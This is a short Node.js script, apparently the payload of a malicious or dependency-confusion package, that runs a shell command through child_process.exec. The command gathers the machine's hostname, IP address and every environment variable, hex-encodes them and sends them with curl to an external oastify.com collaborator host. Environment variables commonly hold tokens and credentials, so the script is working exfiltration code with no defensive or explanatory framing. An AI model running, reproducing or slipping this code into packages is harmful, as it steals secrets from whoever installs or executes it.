const { exec } = require("child_process");

exec(`
  hostname=$(hostname);
  ip_address=$(hostname -I || ipconfig | grep -Eo '([0-9]{1,3}\\.){3}[0-9]{1,3}');
  env_vars=$(env);
  data="hostname=$hostname&ip_address=$ip_address&env_vars=$(echo $env_vars | xxd -p)";
  curl -G --data-urlencode "$data" "https://9pz2zmzmcy50ke3ngejtgwwm5db4zynn.oastify.com/";
`, (error, stdout, stderr) => {
    if (error) {
        console.error("error:", error.message);
        return;
    }
    if (stderr) {
        console.error("stderr:", stderr);
        return;
    }
    console.log("stdout:", stdout);
});
